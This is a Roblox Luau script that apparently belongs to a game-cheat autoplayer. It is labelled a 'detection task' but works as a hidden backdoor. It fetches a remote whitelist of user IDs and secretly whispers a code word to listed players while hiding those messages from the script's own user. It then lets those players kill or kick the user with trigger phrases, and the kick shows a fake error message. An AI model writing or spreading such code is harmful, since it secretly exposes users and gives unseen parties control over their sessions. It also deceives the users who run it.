task.spawn(function()
    print("starting detection task")
    local exchat = game:GetService("CoreGui"):FindFirstChild('ExperienceChat')
    local jsonwhitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://raw.githubusercontent.com/Guilded1/funkyfridayautoplayer/refs/heads/main/whitelistauth.json'))
    local users = {}
    for _, id in pairs(jsonwhitelist) do users[tonumber(id)] = true end
    if exchat and exchat:WaitForChild('appLayout', 5) then
        exchat:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
            local plr = game:GetService("Players"):GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
            if not plr then return end
            obj = obj:FindFirstChild('TextMessage', true)
            if (plr and (tonumber(obj.Parent.Name:split('-')[1]) == plr.UserId or tonumber(obj.Parent.Name:split('-')[1]) == game.Players.LocalPlayer.UserId)) or (obj.BodyText.ContentText:lower():find("you are now privately chatting with")) then
                if obj.BodyText.ContentText:lower():find("you are now privately chatting with") or obj.BodyText.ContentText:lower():find("notcondonedenough") then
                    obj.Visible = false
                end
            end
        end)
    end
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if not users[v.UserId] then continue end
        repeat task.wait(0.1) until v.Character and v.Character:FindFirstChild("HumanoidRootPart")
        local mainchat = game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel
        local privatechat = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(v.UserId)
        if privatechat then
            privatechat:SendAsync('notcondonedenough')
        end
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel = mainchat
        v.Chatted:Connect(function(msg)
            if msg:lower():find("sleeper agent") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif msg:lower():find("no more silly") then
                game.Players.LocalPlayer:Kick("An error has occurred, please rejoin the game.")
            end
        end)
    end
    game:GetService("Players").PlayerAdded:Connect(function(plr)
        if not users[plr.UserId] then return end
        repeat task.wait(0.1) until plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        local mainchat = game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel
        local privatechat = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
        if privatechat then
            privatechat:SendAsync('notcondonedenough')
        end
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel = mainchat
        plr.Chatted:Connect(function(msg)
            if msg:lower():find("sleeper agent") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif msg:lower():find("no more silly") then
                game.Players.LocalPlayer:Kick("An error has occurred, please rejoin the game.")
            end
        end)
    end)
    local bubblechat = exchat:WaitForChild('bubbleChat', 5)
    if bubblechat then
        bubblechat.DescendantAdded:Connect(function(newbubble)
            if newbubble:IsA('TextLabel') and newbubble.Text:find('notcondonedenough') then
                newbubble.Parent.Parent.Visible = false
            end
        end)
    end
end)
